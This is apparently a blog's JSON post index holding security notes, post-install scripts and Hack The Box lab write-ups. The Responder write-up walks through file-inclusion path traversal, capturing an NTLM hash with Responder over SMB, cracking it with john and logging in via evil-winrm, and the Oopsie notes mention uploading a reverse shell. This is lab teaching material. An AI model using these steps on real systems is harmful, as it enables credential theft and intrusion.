Layer2[“payload”]: Packet payload Altering packet Adding Layer 4 Layer4=TCP(sport=5600,dport=22)packet=(Layer2/Layer3/Layer4/\"Payload\") Setting TCP flags packet[TCP].flags=\"SA\" Change destination IP packet[IP].dst = \"1.2.3.4\" " }, { "title": "00 - Responder", "url": "/posts/Responder_00/", "categories": "Writeups, HTB, Very_Easy, Responder", "tags": "SAMBA, WinRM", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date ||—|—|—|—|| Very Easy | Windows | 24/05/2022 | 24/05/2022 |Thought process View running services with nmap. Edit /etc/hosts for being able to see the web. Check how web works and think if I can attack doing File Inclusion. Capture Administrator NTLM. Dump hash file to get Administrator Password. Connect with WinRM and find flag file.ResolutionEdit /etc/hosts like this:@IP unika.htbTest the “page” parameter to see if we can access to some commonly known files that will have the same name across networks, Windows domains, and systems. LinkThe most common file to check as Pentester is WINDOWS\\System32\\drivers\\etc\\hosts.Final URL: page=../../../../../../../../windows/system32/drivers/etc/hosts The file incluson was made possible thanks to include() method of php is being used by page parameter to load differents .html depending the lengague of the site.In the PHP configuration file php.ini , “allow_url_include” wrapper is set to “Off” by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to “Off”, PHP will not prevent the loading of SMB URLs. We can use Responder to steal NTLM hash.$ sudo python3 Responder.py -I tun0Now we tell the server to include a resource from our SMB Server by setting the “page” parameter.http://unika.htb/?page=//@IP/somefileThe server will try to finde the file but it doesn’t exists. Mean while, we captured the NetNTLMv for the Administrator User. Now with john we can dump the hash.$ john -w=/usr/share/wordlists/rockyou.txt hash.txtFinally, with the username and password, we can WinRM the machine to find if there’s any file with the Flag.$ evil-winrm -i @IP_Server -u administrator -p badmintonWinRMWindows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to : \t→ Remotely communicate and interface with hosts \t→ Execute commands remotely on systems that are not local to you but are network accessible. \t→ Monitor, manage and configure servers, operating systems and client machines from a remote location[//]: We can find credentials (typically username and password) for a user who has remote management privileges and execute PS.File Inclusion VulnerabilityDynamic websites include HTML pages on the fly based on some of the parameters (Cookies, POST parameters…)LocalLocal File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when the attacker can use ../ in the inputted file and view sensitive files of the server.RemoteSimilar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.include()File 1 --&gt; vars.php &lt;?php$color = 'green';$fruit = 'apple';?&gt;############################################# File 2 --&gt; test.php&lt;?phpecho \"A $color $fruit\"; // output = \"A\"include 'vars.php';echo \"A $color $fruit\"; // output = \"A green apple\"?&gt;More info about php include(). LinkNTLMCollection of authentication protocols created by Microsoft. It is a challenge-response authentication protocol used to authenticate a client to a resource on an Active Directory domain. The client sends the user name and domain name to the server. The server generates a random character string, referred to as the challenge. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server. The server retrieves the user password (or equivilent). The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.More info about NTLM. LinkResponder! It can be used in a lot of ways, in this CTF is going to recreate a SMB Server.When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user’s password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can’t reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge response, and if we find one, we know that is the password." }, { "title": "00 - Redeemer", "url": "/posts/Redeemer_00/", "categories": "Writeups, HTB, Very_Easy, Redeemer", "tags": "redis", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date ||—|—|—|—|| Very Easy | Linux | 15/05/2022 | 15/05/2022 |Thought process View running services with nmap. List database KEYS. Get the value of the KEY.redisRedis is an ‘in-memory’ database. In-memory databases is managed in the RAM of the System in contrast to databases that stores in Disks/SSD (MySQL). The data retrieval time is very small and are commonly used as cache.Commands Interact with DB redis-cli Show Server info INFO List Databases CONFIG GET databases Select database select Show keys KEYS * View value of stored key get key_name Connect to redis server $ redis-cli -h @IP -p 6379 ResolutionFirst I listed keys in the server and i say that there was one call it “flag”.I searched in google how to get the value of a key. After the research I found that the command was get flag and has allowed me to know the flag." }, { "title": "Post Installation Script - Debian & Ubuntu", "url": "/posts/Post_Installation_Script_Debian_Ubuntu/", "categories": "Cheatsheet, Personal", "tags": "Script, Post_installation", "date": "2022-08-20 00:00:00 +0200", "snippet": "Post Installation Script - Debian &amp; Ubuntu#!/bin/bash# ===================# Author: @impulsado# Web: impulsado.org# Date: 18/10/2022# ===================# === FUNCTIONS ===function startCheck() { if [[ \"$EUID\" -ne 0 ]]; then echo \"\" echo \"Must be root!\" echo \"\" exit 1 fi ping -c 1 -q google.com &gt;&amp;/dev/null if [[ $? != 0 ]]; then echo \"\" echo \"Must have internet connection!\" echo \"\" exit 1 fi echo \"\" echo \"==============================\" echo \" Welcome to your new O.S! \" echo \"==============================\" echo \"\" echo \"\" read -p \"Enter your username: \" username if [[ $username == \"root\" ]]; then echo \"\" echo \"Please, enter another username!\" echo \"\" fi read -p \"Which SHELL do you prefere BASH [B] or ZSH [Z]? \" -e -i \"Y\" usr_op_shell read -p \"Do you want to install/configure SSH? [Y/n] \" -e -i \"Y\" usr_op_ssh read -p \"Do you want to install/configure TMUX? [Y/n] \" -e -i \"Y\" usr_op_tmux read -p \"Do you want to install/configure NEOVIM? [Y/n] \" -e -i \"Y\" usr_op_neovim read -p \"Select other apps you want install: \" -e -i \"wget bat nmap tcpdump curl xclip\" usr_apps echo \"\" read -p \"Do you want to proceed? [Y/n] \" -e -i \"Y\" usr_op if [[ $usr_op != \"Y\" ]]; then echo \"\" echo \"See you soon!\" echo \"\" exit 2 fi}function initial() { apt update -y &amp;&amp; apt upgrade -y apt install -y $usr_apps echo \"$username ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers rm -d /home/$username/{Documents,Music,Pictures,Public,Templates,Videos} mkdir /home/$username/{Scripts,Programs} chown $username:$username /home/$username/Scripts chown $username:$username /home/$username/Programs timedatectl set-timezone Europe/Madrid clear}function zshrc() { # Download &amp; Install Oh-My-ZSH sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" # Download &amp; Install Starship curl -sS https://starship.rs/install.sh | sh # Download plugins git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-/home/$username/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting # Change .zshrc sed -i 's/(git)/(git sudo zsh-autosuggestions zsh-syntax-highlighting)/g' /home/$username/.zshrc cat &lt;&lt;EOF &gt;&gt; /home/$username/.zshrc# === ALIAS ===alias ls='ls --color=auto'alias ll='ls -la --color=auto'alias cat='batcat'alias update='sudo apt update -y &amp;&amp; sudo apt upgrade -y'alias poweroff='sudo systemctl poweroff'alias reboot='sudo systemctl reboot'alias apt='sudo apt'alias mkt='mkdir'alias tmux='tmux -u'alias vim='nvim'alias myip='curl ifconfig.co/'alias copy='xcopy -sel c &lt;'# === OTHERS ===export PATH=$PATH:/home/$username/Scripts/eval \"$(starship init zsh)\"EOF}function sshInstall() { if [[ $usr_op_ssh != \"Y\" ]]; then return 2 fi apt install -y openssh-server systemctl enable ssh systemctl stop ssh cat &lt;&lt;EOF &gt; /etc/ssh/sshd_config# === NEW SSH CONFIGURATION ===# Protocolo 1 is older and less secureProtocol 2# Limit passwords attemptsMaxAuthTries 3# Disable root loginPermitRootLogin no# Disable empty passwords to loginPermitEmptyPasswords no# Disable X11 ForwardingX11Forwarding no# Period of time before client gets disconnected (Seconds)ClientAliveInterval 15# Server waiting time after a connection request is made (Seconds)LoginGraceTime 20EOF systemctl start ssh clear}function tmuxInstall() { if [[ $usr_op_tmux != \"Y\" ]]; then return 2 fi apt install -y tmux git git clone https://github.com/tmux-plugins/tpm /home/$username/.tmux/plugins/tpm touch /home/$username/.tmux.conf cat &lt;&lt;EOF &gt; /home/$username/.tmux.conf# === MAIN ===# Reload config fileunbind rbind r source-file /home/$username/.tmux.conf# Double prefix to change paneunbind C-bbind C-b select-pane -t :.+# Split panebind h split-window -vbind v split-window -h# Mouse friendlyset -g mouse on# Start index at number 1set -g base-index 1# Modern colorsset -g default-terminal \"screen-256color\"set -ga terminal-overrides \",alacritty:Tc\"# Set scroll history to 100,000 linesset-option -g history-limit 100000# Window automatically rename set-option -g automatic-rename on# Quietset -g visual-activity offset -g visual-bell offset -g visual-silence offset -g monitor-activity offset -g bell-action none# === DESIGN ===# Remove extra informationset-option -g status-right ''# Centre window namesset-option -g status-justify centre# Default window title colorsset-window-option -g window-status-style \"fg=white,bg=default\"# Active window title colorsset-window-option -g window-status-current-style \"fg=red,bg=default\"# Status bar colorsset-option -g status-style \"fg=green,bg=#292929\"# Pane borderset-option -g pane-border-style \"fg=#292929\"set-option -g pane-active-border-style \"fg=white\"EOF chown $username:$username /home/$username/.tmux.conf tmux source-file /home/$username/.tmux.conf clear}function bashrc() {cat &lt;&lt;EOF &gt;&gt; /home/$username/.bashrc# === ALIAS ===alias ls='ls --color=auto'alias ll='ls -la --color=auto'alias cat='batcat'alias update='sudo apt update -y &amp;&amp; sudo apt upgrade -y'alias poweroff='sudo systemctl poweroff'alias reboot='sudo systemctl reboot'alias apt='sudo apt'alias mkt='mkdir'alias tmux='tmux -u'alias vim='nvim'alias myip='curl ifconfig.co/'alias copy='xcopy -sel c &lt;'# === OTHERS ===export PATH=$PATH:/home/$username/Scripts/PS1='\\[\\e[0;38;5;46m\\]\\u\\[\\e[0;38;5;46m\\]@\\[\\e[0;38;5;46m\\]\\H \\[\\e[0m\\][\\[\\e[0m\\]\\w\\[\\e[0m\\]] \\[\\e[0;93m\\]\\$ \\[\\e[0m\\]'EOF}function secureOS() { # Enable broadcast echo Protection echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts # Disable Source Routed Packets for i in /proc/sys/net/ipv4/conf/*/accept_source_route; do echo 0 &gt; $i done # Enable TCP SYN Cookie Protection echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies # Disable ICMP Redirect Acceptance for i in /proc/sys/net/ipv4/conf/*/accept_redirects; do echo 0 &gt; $i done # Don't send Redirect Messages for i in /proc/sys/net/ipv4/conf/*/send_redirects; do echo 0 &gt; $i done # Drop Spoofed Packets coming in on an interface, which, if replied to, # would result in the reply going out a different interface. for i in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 1 &gt; $i done}function nvimInstall() { if [[ $usr_op_neovim != \"Y\" ]]; then return 2 fi apt install -y neovim &gt; /dev/null if [ ! -d /home/$username/.config/nvim ]; then mkdir -p /home/$username/.config/nvim cat &lt;&lt;EOF &gt;&gt; /home/$username/.config/nvim/init.vimsyntax on \" syntax highlightingsyntax on \" syntax highlightingset hidden \" Required to keep multiple buffers openset nocompatible \" disable compatibility to old-time viset encoding=utf-8 \" The encoding displayedset showmatch \" show matchingset ignorecase \" case insensitiveset mouse=v \" middle-click paste withset hlsearch \" highlight searchset smartcase \" Enable smart-case searchset incsearch \" incremental searchset tabstop=4 \" number of columns occupied by a tabset softtabstop=4 \" see multiple spaces as tabstops so &lt;BS&gt; does the right thingset expandtab \" converts tabs to white spaceset shiftwidth=4 \" width for autoindentsset autoindent \" indent a new line the same amount as the line just typedset number \" add line numbersset wildmode=longest,list \" get bash-like tab completionsfiletype plugin indent on \" allow auto-indenting depending on file typeset mouse=a \" enable mouse clickset clipboard=unnamedplus \" using system clipboardfiletype plugin onset cursorline \" highlight current cursorlineset ttyfast \" Speed up scrolling in Vimset t_Co=256 \" Support 256 colorsset conceallevel=0 \" Can see `` in Markdown filesset fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936set termencoding=utf-8set encoding=utf-8EOFfi}function printEnd() { clear echo \"\" echo \"\" echo \" BASH: source ~/.bashrc\" echo \"\" echo \" ZSH: source ~/.zshrc\" echo \"\" echo \"\" echo \"&gt; Author: impulsado\"}# === MAIN ===startCheckif [[ $usr_op == \"Y\" ]]; then initial if [[ $usr_op_shell == \"B\" ]]; then bashrc else zshrc fi sshInstall tmuxInstall nvimInstall secureOS sleep 1 printEndfi" }, { "title": "Post Installation Script - Arch", "url": "/posts/Post_Installation_Script_Arch/", "categories": "Cheatsheet, Personal", "tags": "Script, Post_installation", "date": "2022-08-20 00:00:00 +0200", "snippet": "Post Installation Script - ArchTHIS SCRIPT IS OUTDATED!Thanks to @zenobia for helping me with this script.#!/bin/bash# ===================# Author: @impulsado# Web: impulsado.org# Date: 08/07/2022# ===================# === FUNCTIONS ===function startCheck() { if [[ \"$EUID\" -ne 0 ]]; then echo \"\" echo \"Must be root!\" echo \"\" exit 1 fi ping -c 1 -q google.com &gt;&amp;/dev/null if [[ $? != 0 ]]; then echo \"\" echo \"Must have internet connection!\" echo \"\" exit 1 fi echo \"\" echo \" Welcome to your new O.S. \" echo \"\" echo \"\" read -p \"Enter your username: \" username read -p \"Select the apps you want install: \" -e -i \"bat zoxide fzf nmap tcpdump\" usr_apps echo \"\" read -p \"Do you want to start? (Y/n) \" -e -i \"Y\" usr_op if [[ $usr_op != \"Y\" ]]; then echo \"\" echo \"See you soon!\" echo \"\" exit 2 fi}function initial() { pacman -Syu pacman -Sy $usr_apps echo \"$username ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers rm -d /home/$username/{Documents,Music,Pictures,Public,Templates,Videos} mkdir /home/$username/Scripts timedatectl set-timezone Europe/Madrid clear}function sshInstall() { read -p \"Choose the new SSH Port: \" usr_port pacman -Sy openssh systemctl enable ssh systemctl stop ssh cat &lt;&lt;EOF &gt; /etc/ssh/sshd_config# NEW CONFPort $usr_portMaxAuthTries 3PermitRootLogin noPermitEmptyPasswords noEOF sed -i '/X11Forwarding yes/c\\X11Forwarding no' systemctl start ssh clear}function tmuxInstall() { pacman -Sy tmux git git clone https://github.com/tmux-plugins/tpm /home/$username/.tmux/plugins/tpm touch /home/$username/.tmux.conf cat &lt;&lt;EOF &gt; /home/$username/.tmux.confunbind rbind r source-file /home/$username/.tmux.confunbind C-bbind C-b select-pane -t :.+bind h split-window -vbind v split-window -hset -g mouse onEOF chown $username:$username /home/$username/.tmux.conf cat &lt;&lt;EOF &gt; /home/$username/README.tmux 1. \"tmux new-session\" 2. \"tmux source .tmux.conf\" 3. \"prefix + I\" 4. \"nano .tmux.conf\" and append this text. --- set -g @plugin 'tmux-plugins/tpm' set -g @plugin 'tmux-plugins/tmux-sensible' run '/home/$username/.tmux/plugins/tpm/tpm' --- 5. \"prefix + r\" 6. \"nano .tmux.conf\" insert this text before \"run\" command. --- set -g @plugin 'dracula/tmux' set -g @dracula-show-left-icon session set -g @dracula-show-network false set -g @dracula-show-battery false set -g @dracula-show-weather false --- 7. \"prefix + I\"EOF tmux source-file /home/$username/.tmux.conf clear}function bashrc() {cat &lt;&lt;EOF &gt;&gt; /home/$username/.bashrc# === ALIAS ===alias ll='ls -la --color=auto'alias cat='batcat'alias update='sudo pacman -Syu'alias poweroff='sudo systemctl poweroff'alias restart='sudo systemctl restart'alias pacman='sudo pacman'# === OTHERS ===eval \"$(zoxide init bash)\"export PATH=$PATH:/home/$username/ScriptsEOF source /home/$username/.bashrc}function secureOS() { # Enable broadcast echo Protection echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts # Disable Source Routed Packets for i in /proc/sys/net/ipv4/conf/*/accept_source_route; do echo 0 &gt; $i done # Enable TCP SYN Cookie Protection echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies # Disable ICMP Redirect Acceptance for i in /proc/sys/net/ipv4/conf/*/accept_redirects; do echo 0 &gt; $i done # Don't send Redirect Messages for i in /proc/sys/net/ipv4/conf/*/send_redirects; do echo 0 &gt; $i done # Drop Spoofed Packets coming in on an interface, which, if replied to, # would result in the reply going out a different interface. for i in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 1 &gt; $i done}function printEnd() { clear echo \"\" echo \"=== SSH ===\" echo \"Port Changed --&gt; $usr_port\" echo \"Installed Succesfully!\" echo \"\" echo \"=== TMUX ===\" echo \"README.tmux\" echo \"Installed Succesfully!\" echo \"\" echo \"=== SECURITY ===\" echo \"System secured Succesfully!\" echo \"\" echo \"=== BASHRC ===\" echo \"Updated Succesfully!\" echo \"\"}# === MAIN ===startCheckif [[ $usr_op == \"Y\" ]]; then initial sshInstall tmuxInstall bashrc secureOS sleep 1 printEndfi" }, { "title": "OpenVPN", "url": "/posts/OpenVPN/", "categories": "cybersecAnalyst, VPN, OpenVPN", "tags": "OpenVPN", "date": "2022-08-20 00:00:00 +0200", "snippet": "OpenVPNSupports SSL/TLS Encryption. Can use either UDP or TCP protocols. Default port 1194.OpenVPN uses the OpenSSL library, and because of this it has these cryptographic capabilities.Can use conventional encryption using pre-shared keys (Static Key mode) or public key security (SSL/TLS) using client and server certificates.TAP vs TUNTAP Layer 2Bridge two computers only using the Ethernet cable for the connectivity between them. Act as a Switch. The downside is that has a lot of problems with routing.TUN Layer 3Bridge two devices through Ethernet to create a virtual host server to divert the information. Used with routing. The downside is that it connects 2 machines, no 2 LAN’s. TAP TUN Allows a client to connect to another LAN. (Access to resources or services) Connect only to a Server The network load is higher because it includes the routes of each network. You can access to network resources simulating that they are in the server but is not his function. Open LAN to the other (Depending on the configuration) and can introduce Security Breaches Faster and easier to setup Security and EncryptionTLS VersionOpenVPN accepts TLS 1.0 by default, which is 20 years old.With tls-version-min 1.2 we enforce TLS 1.2, which the best protocol available currently for OpenVPN. TLS 1.2 is supported since OpenVPN 2.3.3.CertificateOpenVPN uses an RSA certificate with a 2048 bits key by default.OpenVPN uses SHA-256 as the signature hash by default.Data ChannelBy default, OpenVPN uses BF-CBC as the data channel cipher.[//]: Blowfish is an old (1993) and weak algorithm. Even the official OpenVPN documentation admits it.AES is today’s standard. It’s the fastest and more secure cipher available today.AES-256 is 40% slower than AES-128, and there isn’t any real reason to use a 256 bits key over a 128 bits key with AES. Moreover, AES-256 is more vulnerable to Timing attacks.AES-GCM is an AEAD cipher which means it simultaneously provides confidentiality, integrity, and authenticity assurances on the data.Diffie-Hellman key exchangeOpenVPN uses a 2048 bits DH key by default.OpenVPN 2.4 added support for ECDH keys. Elliptic curve cryptography is faster, lighter and more secure.HMAC digest algorithm Authenticate data channel packets and (if enabled) tls-auth control channel packets with HMAC using message digest algorithm alg. (The default is SHA1 ). HMAC is a commonly used message authentication algorithm (MAC) that uses a data string, a secure hash algorithm, and a key, to produce a digital signature. If an AEAD cipher mode (e.g. GCM) is chosen, the specified –auth algorithm is ignored for the data channel, and the authentication method of the AEAD cipher is used instead. Note that alg still specifies the digest used for tls-auth.Source: OpenVPN man –auth algTLS-Auth and TLS-cryptProvide an additional layer of security and mitigate DoS attacks. They aren’t used by default by OpenVPN.tls-crypt is an OpenVPN 2.4 feature that provides encryption in addition to authentication (unlike tls-auth). It is more privacy-friendly." }, { "title": "00 - Oopsie", "url": "/posts/Oopsie_00/", "categories": "Writeups, HTB, Very_Easy, Oopsie", "tags": "php, SUID", "date": "2022-08-20 00:00:00 +0200", "snippet": "Intro| Dificulty | OS | Start Date | End Date | |—|—|—|—|| Very Easy | Linux | 03/06/2022 | 05/06/2022 |Process Common enumeration. Use Burp Suite to find new directories. Manipulate cookies to be admin and upload files. Dirbust the site to find where are the uploads located. Upload reverse shell Search for other users Login with that user and search the user flag. Privilege Escalation with SUID.Burpsuite Configure Firefox to send traffic trought the proxy. Settings &gt; Search “Proxy” &gt; Settings. Change to Manual proxy. Enter Loopback @IP and port 8080 Disable interception in Burp as it’s Proxy &gt; Intercept &gt; Intercept in on (Disable)CookiesFound that admin was id=34322 so change the Guest id to simulate he’s the admin.Reverse ShellSearch for common directories. This is a Web Server so is a good idea to check /var/www/html/xxx/. There is a username and a password. Login as robert and search the user.txt.Find the user group and the files that belong to it.Found executable file in /usr/bin/ named bugtracker that only bugtracker group can execute." }, { "title": "Kernel", "url": "/posts/Kernel_Security/", "categories": "cybersecAnalyst, Kernel", "tags": "kernel", "date": "2022-08-20 00:00:00 +0200", "snippet": "KernelList of Linux Kernel parameters that provide more security against DDoS attacks, Spoofing…Kernel Documentationtcp_syncookies - INTEGERSyncookie allows the server to defer using up any resources until the third packet in the three-way handshake has been received.Only valid when the kernel was compiled with CONFIG_SYN_COOKIESSend out syncookies when the syn backlog queue of a socket overflows. This is to prevent against the common 'SYN flood attack'Default: 1More Information: https://lwn.net/Articles/277146/tcp_synack_retries - INTEGERSpecifies how many times to try to establish a passive TCP connection that was started by another host.Number of times SYNACKs for a passive TCP connection attempt willbe retransmitted. Should not be higher than 255. Default valueis 5, which corresponds to 31seconds till the last retransmissionwith the current initial RTO of 1second. With this the final timeoutfor a passive TCP connection will happen after 63seconds.accept_source_route - INTEGERPrevents TCP from having control over the routing of packets.Accept source routing (routing extension header).\\&gt;= 0: Accept only routing header type 2.&lt; 0: Do not accept routing header.Default: 0icmp_echo_ignore_broadcasts - BOOLEANIgnore all broadcast ICMP ECHO.If set non-zero, then the kernel will ignore all ICMP ECHO andTIMESTAMP requests sent to it via broadcast/multicast.Default: 1accept_redirects - BOOLEANIf the value is 0, ICMP redirects are not accepted to avoid Man in the middle attacks.Accept ICMP redirect messages.accept_redirects for the interface will be enabled if:\t- both conf/{all,interface}/accept_redirects are TRUE in the case\t forwarding for the interface is enabledor\t- at least one of conf/{all,interface}/accept_redirects is TRUE in the\t case forwarding for the interface is disabledaccept_redirects for the interface will be disabled otherwisedefault TRUE (host)\tFALSE (router)send_redirects - BOOLEANIf the value is 0 it prevents the machine from sending ICMP packets with redirects.Send redirects, if router.send_redirects for the interface will be enabled if at least one ofconf/{all,interface}/send_redirects is set to TRUE,it will be disabled otherwiseDefault: TRUErp_filter - INTEGERProtects against IP spoofing attacks.0 - No source validation.\t1 - Strict mode as defined in RFC3704 Strict Reverse PathEach incoming packet is tested against the FIB and if the interface is not the best reverse path the packet check will fail.By default failed packets are discarded.2 - Loose mode as defined in RFC3704 Loose Reverse PathEach incoming packet's source address is also tested against the FIBand if the source address is not reachable via any interfacethe packet check will fail.Current recommended practice in RFC3704 is to enable strict modeto prevent IP spoofing from DDos attacks. If using asymmetric routingor other complicated routing, then loose mode is recommended.The max value from conf/{all,interface}/rp_filter is used when doing source validation on the {interface}.Default value is 0. Note that some distributions enable it in startup scripts.ip_forward - BOOLEANThe value 0 disables packet forwarding.0 - disabled (default)not 0 - enabledForward Packets between interfaces.This variable is special, its change resets all configuration parameters to their default state (RFC1122 for hosts, RFC1812 for routers)icmp_ignore_bogus_error_responses - BOOLEANIf the value is 1, it activates the protection against malformed error messages.Some routers violate RFC1122 by sending bogus responses to broadcastframes. Such violations are normally logged via a kernel warning.If this is set to TRUE, the kernel will not give such warnings, whichwill avoid log file clutter.Default: 1" }, { "title": "John The Reapper", "url": "/posts/John_The_Reapper/", "categories": "Cheatsheet, Password_Cracking", "tags": "Jhon_the_reapper", "date": "2022-08-20 00:00:00 +0200", "snippet": "John The ReapperAdvanced offline password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs, GPUs, and even some FPGAs.Download Link Dicctionary Attack john --wordlist=/usr/share/wordlists/rockyou.txt hashfile BruteForce john --incremental hashfile " }, { "title": "IPSec", "url": "/posts/IPSec/", "categories": "cybersecAnalyst, VPN, IPSec", "tags": "IPSec", "date": "2022-08-20 00:00:00 +0200", "snippet": "IPSec (Internet Protocol Security)IPSec (Internet Protocol Security) is a framework that helps us to protect IP traffic on the network layer. Confidentiality: Encrypt our data. Nobody except the sender and receiver will be able to read our data. Integrity: Make sure that nobody changes the data in our packets. By calculating a hash value, the sender and receiver will be able to check if changes have been made to the packet. Authentication: The sender and receiver will authenticate each other to make sure that we are really talking with the device we intend to. Anti-replay: Even if a packet is encrypted and authenticated, an attacker could try to capture these packets and send them again. By using sequence numbers, IPsec will not transmit any duplicate packets.Use cases: Between two routers to create a site-to-site VPN that “bridges” two LANs together. Between a firewall and windows host for remote access VPN. Between two Linux servers to protect an insecure protocol like telnet.IKE (Internet Key Exchange)IKE phase 1Two peers negotiate about the encryption, authentication, hashing and other protocols that they want to use and some other parameters that are required.ISAKMP (Internet Security Association and Key Management Protocol) session is established.The tunnels is used for management traffic. This tunnel is used as a secure method to establish the second tunnel called the IKE phase 2 tunnel or IPsec tunnel.IKE phase 2Protect user’s data that will be sent thought that second tunnel. Here is only one mode to build the IKE phase 2 tunnel, which is called quick mode.Negotiate about: IPSec Protocol: AH or ESP. Encapsulation Mode: Transport or Tunnel mode. Encryption: DES, 3DES or AES. Authentication: MD5 or SHA Lifetime: How long tunnel will be valid. Refresh keying material? (Optional) DH exchange: used for PFS (Perfect Forward Secrecy)![[Pasted image 20220617083601.png]]IKE builds the tunnels for us but it doesn’t authenticate or encrypt user data.IPSec ProtocolsAH (Authentication Header)AH offers authentication and integrity, but it doesn’t offer any encryption. It protects the IP packet by calculating a hash value over almost all fields in the IP header. The fields it excludes are the ones that can be changed in transit (TTL and header checksum).AH is obsolete because it does not provide confidentiality and has problems with NAT/PAT.ESP (Encapsulating Security Payload)Provides data confidentiality (encryption) and authentication (data integrity, data origin authentication, and replay protection). ESP can be used with confidentiality only, authentication only, or both confidentiality and authentication.!!" }, { "title": "Ikev2", "url": "/posts/IKEv2/", "categories": "", "tags": "", "date": "2022-08-20 00:00:00 +0200", "snippet": "layout: posttitle: IKEv2date: 2022-08-20categories: [cybersecAnalyst,VPN,IPSec]tags: [IKE,IKEv2]—IKE and IKEv2IKE is an IPSec-based tunneling protocol that provides a secure VPN communication channel and defines automatic means of negotiation and authentication for IPSec security associations in a protected manner.1998 → IKE2005 → IKEv2Benefits of IKEv2 VPN ProtocolSecurityIKEv2 employs server certificate authentication, which means it won’t perform any actions until it determines the requestor’s identity.ReliabilityIn the first version of the protocol, if you tried to switch to a different internet connection, e.g. from Wi-Fi to mobile internet, with VPN on, it would disrupt the VPN connection and would require a reconnection.Thanks to the reliability measures implemented in IKEv2, this issue has been fixed. Moreover, IKEv2 implements a MOBIKE technology, which allows it to be used by mobile and multi-homed users.SpeedWell-minded architecture and effective message exchange system in IKEv2 allow for better performance.Pros and cons| Pros | Cons || — | — || Provides very stable connection | Closed-source (except for Linux) || Fast speed | Possibly compromised by the NSA || Compatible with a range of ciphers, including AES-256 | Bad for bypassing firewalls || Good at handling network changes | || Supports Perfect Forward Secrecy | |" }, { "title": "host key verification failed", "url": "/posts/Host_Key_Verification_Failed/", "categories": "Troubleshooting", "tags": "ssh", "date": "2022-08-20 00:00:00 +0200", "snippet": "host key verification failed WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!Someone could be eavesdropping on you right now (man-in-the-middle attack)!It is also possible that a host key has just been changed.The fingerprint for the ECDSA key sent by the remote host isXX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX: (Omitted).Please contact your system administrator.Add correct host key in /home/guest/.ssh/known_hosts to get rid of this message.Offending ECDSA key in /home/guest/.ssh/known_hosts:2 remove with: ssh-keygen -f \"/home/guest/.ssh/known_hosts\" -R username.no-ip.orgECDSA host key for username.no-ip.org has changed and you have requested strict checking.Host key verification failed.SolutionExecute this command:ssh-keygen -R @IP" }, { "title": "Gobuster", "url": "/posts/Gobuster/", "categories": "Cheatsheet, Common", "tags": "gobuster, dirbuster", "date": "2022-08-20 00:00:00 +0200", "snippet": "DirBusterBruteforce directorys and files in a server or application.Common –&gt; /usr/share/wordlists/dirb/common.txt[//]: Do not check .git files. Basic $ gobuster dir -u @IP/Domain -w /path/to/wordlist Best WordlistSecLists Discovery lists. Common –&gt; /usr/share/seclists/Discovery/Web-Content/raft-small-words.txtLarger –&gt; /usr/share/seclists/Discovery/Web-Content/raft-large-words.txtTomcat –&gt; /usr/share/seclists/Discovery/Web-Content/tomcat.txtTarget ExtensionsIf site is using X file extension you can use -x Basic Target php $ gobuster dir -u @IP/Domain -w /path/to/wordlist -x php VHOST BustingBrute force Virtual Hosts (subdomains).Append subdomains to the beginning of Domain.Common –&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt Basic $ gobuster vhost -u @IP/Domain -w /path/to/wordlist " }, { "title": "GitHub Credentials", "url": "/posts/Github_Credentials/", "categories": "Troubleshooting", "tags": "Github", "date": "2022-08-20 00:00:00 +0200", "snippet": "GitHub CredentialsI was having problems verifying my user when committing to GitHub.The reason was because they have disabled the use of passwords for LogIn. Now you have to use your personal token.This video shows the process: YoutTube Video" }, { "title": "Firewall", "url": "/posts/Firewall/", "categories": "cybersecAnalyst, Firewall", "tags": "Firewall", "date": "2022-08-20 00:00:00 +0200", "snippet": "Firewallnftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework. It provides a new packet filtering framework, a new user-space utility (nft), and a compatibility layer for {ip,ip6}tables. It uses the existing hooks, connection tracking system, user-space queueing component, and logging subsystem of netfilter.nftables user-space utility nft performs most of the rule-set evaluation before handing rule-sets to the kernel. Rules are stored in chains, which in turn are stored in tables.TablesTables hold chains. Unlike tables in iptables, there are no built-in tables in nftables. The number of tables and their names is up to the user. However, each table only has one address family and only applies to packets of this family. nftables family   ip (Only IPv4)   ip6 (Only IPv6)   inet (IPv4 and IPv6)   arp   bridge   ChainsThe purpose of chains is to hold Rules. Unlike chains in iptables, there are no built-in chains in nftables. 